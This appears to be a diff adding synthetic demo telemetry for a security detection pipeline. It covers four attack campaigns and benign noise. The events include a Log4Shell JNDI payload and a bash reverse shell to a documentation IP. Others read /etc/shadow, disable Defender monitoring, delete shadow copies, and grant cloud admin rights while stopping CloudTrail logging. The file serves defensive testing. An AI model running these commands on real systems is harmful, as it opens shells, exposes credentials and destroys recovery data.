@@ -1,0 +1,21 @@
+# Synthetic demo telemetry (documentation-range IPs only). Loaded through the normal ingest path, so
+# detections, correlations, threats and incidents are real products of the pipeline, not canned rows.
+# `ago` is minutes before the load time. Nothing here is executed anywhere.
+events:
+  # --- Campaign 1: password spraying then a successful login on the VPN
+  - {ago: 95, title: "Password spraying from 203.0.113.9", source: authentication, event_type: authentication.password_spraying, source_ip: 203.0.113.9, asset_name: demo-vpn-01}
+  - {ago: 71, title: "Login after repeated failures from 203.0.113.9", source: authentication, event_type: authentication.brute_force_success, source_ip: 203.0.113.9, username: svc-vpn, asset_name: demo-vpn-01}
+  # --- Campaign 2: web exploitation and a reverse shell
+  - {ago: 60, title: "HTTP request", source: application, event_type: web.request, source_ip: 198.51.100.24, asset_name: demo-web-01, raw_data: {user_agent: "${jndi:ldap://203.0.113.5:1389/Basic/Command/Base64/d2dldA==}", url: "/api/v1/login"}}
+  - {ago: 57, title: "Process creation", source: edr, event_type: process.start, asset_name: demo-web-01, username: tomcat, command_line: "bash -c 'bash -i >& /dev/tcp/203.0.113.5/4444 0>&1'"}
+  - {ago: 52, title: "Process creation", source: edr, event_type: process.start, asset_name: demo-web-01, username: tomcat, command_line: "cat /etc/shadow"}
+  # --- Campaign 3: ransomware precursors on a file server
+  - {ago: 40, title: "Process creation", source: edr, event_type: process.start, asset_name: demo-fs-01, username: svc-backup, process_name: powershell.exe, command_line: "powershell -c Set-MpPreference -DisableRealtimeMonitoring $true"}
+  - {ago: 33, title: "Process creation", source: edr, event_type: process.start, asset_name: demo-fs-01, username: svc-backup, process_name: vssadmin.exe, command_line: "vssadmin.exe delete shadows /all /quiet"}
+  # --- Campaign 4: cloud
+  - {ago: 25, title: "CloudTrail event", source: cloud_audit, event_type: cloud.audit, username: demo-ci, source_ip: 198.51.100.40, raw_data: {eventName: AttachUserPolicy, requestParameters: {policyArn: "arn:aws:iam::aws:policy/AdministratorAccess"}}}
+  - {ago: 22, title: "CloudTrail event", source: cloud_audit, event_type: cloud.audit, username: demo-ci, source_ip: 198.51.100.40, raw_data: {eventName: StopLogging, eventSource: cloudtrail.amazonaws.com}}
+  # --- Benign noise (should NOT alert)
+  - {ago: 20, title: "Sign-in", source: authentication, event_type: authentication.success, username: alice, source_ip: 10.0.3.4}
+  - {ago: 18, title: "Process creation", source: edr, event_type: process.start, asset_name: demo-app-02, command_line: "systemctl restart nginx"}
+  - {ago: 15, title: "HTTP request", source: application, event_type: web.request, source_ip: 198.51.100.5, raw_data: {url: "/", user_agent: "Mozilla/5.0 Chrome/124.0"}}
